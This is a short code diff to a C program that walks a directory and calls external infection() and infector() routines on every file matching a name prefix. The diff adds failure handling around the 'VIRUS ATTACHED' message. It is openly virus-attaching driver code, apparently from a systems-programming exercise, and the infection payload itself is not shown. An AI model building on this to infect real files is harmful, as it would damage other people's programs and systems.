@@ -11,7 +11,7 @@
 
 extern int system_call();
 extern void infection();
-extern void infector(char *);
+extern int infector(char *);
 
 struct linux_dirent {
     unsigned long long d_ino;
@@ -51,10 +51,14 @@ int main(int argc, char *argv[], char *envp[])
         name = entry->d_name;
 
         if (prefix != 0 && name[0] == prefix) {
-            system_call(SYS_WRITE, STDOUT, name, strlen(name));
-            system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED\n", 16);
             infection();
-            infector(name);
+            if (infector(name) < 0) {
+                system_call(SYS_WRITE, STDOUT, name, strlen(name));
+                system_call(SYS_WRITE, STDOUT, " FAILED TO ATTACH\n", 18);
+            } else {
+                system_call(SYS_WRITE, STDOUT, name, strlen(name));
+                system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED\n", 16);
+            }
         } else {
             system_call(SYS_WRITE, STDOUT, name, strlen(name));
             system_call(SYS_WRITE, STDOUT, "\n", 1);
